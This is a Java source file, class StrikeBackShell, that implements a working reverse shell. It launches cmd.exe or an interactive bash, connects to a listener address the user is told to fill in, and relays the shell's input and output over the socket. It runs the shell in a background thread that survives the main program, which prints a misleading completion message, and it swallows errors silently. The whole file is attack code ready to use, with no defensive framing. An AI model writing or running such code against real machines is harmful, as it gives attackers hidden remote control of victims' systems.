import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class StrikeBackShell {
    public static void main(String[] args) {
        // Change host and port to your listener details
        String host = "127.0.0.1";
        int port = 4444;

        // Fork execution into a background thread
        Thread backgroundShell = new Thread(() -> {
            try {
                String os = System.getProperty("os.name").toLowerCase();
                ProcessBuilder pb;
                
                if (os.contains("win")) {
                    pb = new ProcessBuilder("cmd.exe");
                } else {
                    pb = new ProcessBuilder("/bin/bash", "-i");
                }
                
                pb.redirectErrorStream(true);
                Process process = pb.start();
                
                Socket socket = new Socket(host, port);
                
                // Wire socket streams to process streams using standard pipelining threads
                StreamBridge inputBridge = new StreamBridge(socket.getInputStream(), process.getOutputStream());
                StreamBridge outputBridge = new StreamBridge(process.getInputStream(), socket.getOutputStream());
                
                inputBridge.start();
                outputBridge.start();
                
                process.waitFor();
            } catch (Exception e) {
                // Silently handle or log connection drops
            }
        });

        backgroundShell.setDaemon(false);
        backgroundShell.start();
        
        // Main thread can terminate or continue other tasks while shell runs in background
        System.out.println("Main application flow completed.");
    }

    private static class StreamBridge extends Thread {
        private final InputStream source;
        private final OutputStream destination;

        public StreamBridge(InputStream source, OutputStream destination) {
            this.source = source;
            this.destination = destination;
        }

        public void run() {
            try {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = source.read(buffer)) != -1) {
                    destination.write(buffer, 0, length);
                    destination.flush();
                }
            } catch (Exception e) {
                // Connection closed
            }
        }
    }
}
